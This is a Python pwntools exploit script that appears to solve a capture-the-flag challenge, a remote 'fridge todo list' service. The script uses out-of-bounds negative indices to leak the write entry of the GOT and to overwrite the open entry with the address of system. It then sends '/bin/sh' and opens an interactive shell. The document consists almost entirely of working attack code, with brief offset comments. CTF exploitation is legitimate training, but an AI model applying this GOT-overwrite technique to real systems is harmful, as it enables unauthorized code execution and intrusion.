from pwn import *

def printEntry(idx):
	p.sendlineafter('> ', '2')
	p.sendlineafter('read? ', str(idx))
	p.recvuntil('TODO: ')
	return p.recvuntil('\n', drop=True)

def storeEntry(idx, entry):
	p.sendlineafter('> ', '3')
	p.sendlineafter('entry? ', str(idx))
	p.sendlineafter('TODO? ', entry)

def login():
	p.sendlineafter('user: ', 'sploitem')

# .got.plt
# write offset 0x203020:	0x0000000000000916 (todo index -6)
# system offset 0x203038:	0x0000000000000946
# offset between write and system is 0x946 - 0x916 = 0x30
writeOffsetIndex = -6
openOffsetIndex = -4
writeSystemOffset = 0x30

# p = process('./todo')
p = remote('fridge-todo-list.ctfcompetition.com', 1337)

login()
writeOffset = printEntry(writeOffsetIndex).ljust(8,'\x00')
systemOffset = p64(u64(writeOffset) + writeSystemOffset)

print hex(u64(writeOffset))
print hex(u64(systemOffset))

# pause()
storeEntry(openOffsetIndex, 'A'*8 + systemOffset)

p.sendline('/bin/sh')
p.interactive()
p.close()